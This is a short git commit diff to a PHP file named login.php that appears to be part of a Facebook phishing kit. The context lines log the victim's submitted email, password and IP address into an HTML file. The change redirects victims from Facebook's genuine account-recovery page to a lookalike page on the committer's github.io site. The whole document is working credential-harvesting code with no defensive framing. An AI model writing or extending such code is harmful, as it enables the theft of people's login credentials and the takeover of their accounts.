49fe8255edb5cec70f10c992c034c7955b80387c
Charleswayne22 <instagramb188@gmail.com>
2025-06-28 15:55:29 +0100

    login.php

--- login.php
+++ login.php
@@ -5,5 +5,5 @@ $ip = $_SERVER['REMOTE_ADDR'];
 $f = fopen("logger.html", "a"); 
 fwrite ($f, 'FACEBOOK LOGIN: [<b><font color="#DC143C">'.$email.'</font></b>] PASSWORD: [<b><font color="#008000">'.$pass.'</font></b>] IP: [<b><font color="#008080">'.$ip.'</font></b>] <br>');
 fclose($f);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://charleswayne22.github.io/recover/initiate/');
 ?>
